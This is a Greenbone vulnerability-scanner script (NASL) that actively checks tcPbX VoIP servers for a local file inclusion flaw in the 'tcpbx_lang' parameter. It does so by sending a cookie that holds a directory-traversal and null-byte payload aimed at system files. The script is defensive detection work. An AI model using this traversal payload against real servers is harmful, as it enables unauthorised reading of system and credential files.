# SPDX-FileCopyrightText: 2016 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:tcpbx:tcpbx_voip";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.809009");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2016-08-23 16:18:17 +0530 (Tue, 23 Aug 2016)");
  script_name("tcPbX < 1.2.1 'tcpbx_lang' Parameter Local File Inclusion Vulnerability - Active Check");

  script_tag(name:"summary", value:"tcPbX VoIP phone system is prone to a local file inclusion (LFI)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send the crafted http GET request
  and check whether it is able to get password information or not.");

  script_tag(name:"insight", value:"The flaw exists due to 'tcpbx_lang'
  parameter isn't sanitized before being proceeded in the file
  'var/www/html/tcpbx/index.php'.");

  script_tag(name:"impact", value:"Successful exploitation will allow a remote
  attacker to read any file system including file configurations.");

  script_tag(name:"affected", value:"tcPbX versions prior to 1.2.1.");

  script_tag(name:"solution", value:"Update to version 1.2.1 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"qod_type", value:"remote_vul");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/40278");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2016 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_tcpbx_voip_remote_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("tcPbX/Installed");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!get_app_location(port:port, cpe:CPE, nofork:TRUE))
  exit(0);

url = "/tcpbx/";

files = traversal_files();

foreach pattern(keys(files)) {

  file = files[pattern];

  cookie = "tcpbx_lang=../../../../../../../../../../" + file + "%00; PHPSESSID=7rmen68sn4op8cgkc49l86pfu4";

  if(http_vuln_check(port:port, url:url, check_header:TRUE,
                     pattern:pattern, cookie:cookie,
                     extra_check:make_list(">www\.tcpbx\.org", "<title>tcPbX</title>"))) {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
